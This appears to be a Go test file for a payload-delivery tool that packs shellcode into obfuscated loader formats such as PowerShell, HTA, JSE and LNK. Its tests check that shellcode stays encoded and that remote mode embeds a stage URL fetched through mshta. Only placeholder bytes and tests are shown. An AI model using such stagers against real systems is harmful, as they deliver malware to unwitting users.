package delivery

import (
	"strings"
	"testing"
)

// TestEmitterOutputShape exercises every emitter in inline + remote mode (where
// applicable), asserting: (1) exactly one artifact with the right extension,
// (2) raw shellcode never appears in plaintext in script bodies (it is base64 or
// SCRENC-encoded), (3) the remote mode embeds the url, (4) formats that can't do
// remote (raw) error cleanly.
func TestEmitterOutputShape(t *testing.T) {
	sc := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	url := "http://10.0.0.5/stage"

	type tc struct {
		format   string
		ext      string
		remoteOK bool
		marker   string // a string that must appear in the inline output
	}
	cases := []tc{
		{"raw", "bin", false, ""},      // raw has no fetch primitive
		{"ps1", "ps1", true, "VirtualAlloc"},
		{"hta", "hta", true, "WScript.Shell"},
		{"sct", "sct", true, "WScript.Shell"},
		{"vba", "vba", true, "Shell"},
		{"xsl", "xsl", true, "WScript.Shell"},
		{"js", "js", true, "WScript.Shell"},
		{"jse", "jse", true, "#@~^"}, // SCRENC envelope
		{"vbs", "vbs", true, "WScript.Shell"},
		{"wsf", "wsf", true, "WScript.Shell"},
		{"lnk", "lnk", true, ""},     // binary; checked via header byte 0x4C
	}

	for _, c := range cases {
		t.Run(c.format+"_inline", func(t *testing.T) {
			arts, err := emitForTest(c.format, &Spec{Format: c.format, Shellcode: sc})
			if err != nil {
				t.Fatalf("inline emit: %v", err)
			}
			if len(arts) != 1 {
				t.Fatalf("inline %s: got %d artifacts, want 1", c.format, len(arts))
			}
			a := arts[0]
			if !strings.HasSuffix(a.Path, "."+c.ext) {
				t.Errorf("inline %s: path %q, want .%s", c.format, a.Path, c.ext)
			}
			if c.format == "raw" {
				if string(a.Bytes) != string(sc) {
					t.Errorf("raw: bytes not the raw shellcode")
				}
			} else if c.format == "lnk" {
				if len(a.Bytes) == 0 || a.Bytes[0] != 0x4C {
					t.Errorf("lnk: first byte 0x%02X, want 0x4C", safeByte(a.Bytes))
				}
			} else if c.format == "jse" {
				if !strings.HasPrefix(string(a.Bytes), "#@~^") {
					t.Errorf("jse: no SCRENC envelope")
				}
			} else {
				if c.marker != "" && !contains(string(a.Bytes), c.marker) {
					t.Errorf("inline %s: missing %q", c.format, c.marker)
				}
				if contains(string(a.Bytes), string(sc)) {
					t.Errorf("inline %s: raw shellcode leaked", c.format)
				}
			}
		})

		if !c.remoteOK {
			// raw has no remote mode: Emit must error.
			if _, err := emitForTest(c.format, &Spec{Format: c.format, URL: url}); err == nil {
				t.Errorf("%s remote: expected error, got none", c.format)
			}
			continue
		}
		t.Run(c.format+"_remote", func(t *testing.T) {
			arts, err := emitForTest(c.format, &Spec{Format: c.format, URL: url, Launcher: "mshta"})
			if err != nil {
				t.Fatalf("remote emit: %v", err)
			}
			if len(arts) != 1 {
				t.Fatalf("remote %s: got %d artifacts, want 1", c.format, len(arts))
			}
			a := arts[0]
			if c.format == "jse" {
				// the url is inside the SCRENC-encoded body; decode and check.
				body, _ := screncBody(string(a.Bytes))
				dec, err := screncDecodeBody(body)
				if err != nil {
					t.Fatalf("jse remote: decode: %v", err)
				}
				if !contains(string(dec), url) {
					t.Errorf("jse remote: url not in decoded body")
				}
			} else if c.format != "lnk" {
				if !contains(string(a.Bytes), url) {
					t.Errorf("remote %s: url not present in output", c.format)
				}
			}
		})
	}
}

// TestEmitMissingPayloadErrors asserts inline emitters error when no shellcode and
// no url is given (they can't emit anything useful).
func TestEmitMissingPayloadErrors(t *testing.T) {
	for _, f := range []string{"raw", "ps1", "hta", "sct", "vba", "xsl", "js", "jse", "vbs", "wsf", "lnk"} {
		if _, err := emitForTest(f, &Spec{Format: f}); err == nil {
			t.Errorf("%s: expected error for empty spec (no shellcode, no url)", f)
		}
	}
}

// TestEmitWritesToOutDir confirms Emit creates the directory and writes the file
// with an absolute resolved path.
func TestEmitWritesToOutDir(t *testing.T) {
	dir := t.TempDir() + "/sub"
	arts, err := Emit(&Spec{Format: "ps1", Shellcode: []byte{0x01, 0x02}, OutDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(arts) != 1 {
		t.Fatalf("got %d artifacts", len(arts))
	}
	if !strings.HasPrefix(arts[0].Path, dir) {
		t.Errorf("path %q not under %s", arts[0].Path, dir)
	}
}

// emitForTest calls the emitter's Emit directly (no fs writes) for shape checks.
func emitForTest(format string, s *Spec) ([]Artifact, error) {
	e, err := Resolve(format)
	if err != nil {
		return nil, err
	}
	return e.Emit(s)
}

func safeByte(b []byte) byte {
	if len(b) == 0 {
		return 0
	}
	return b[0]
}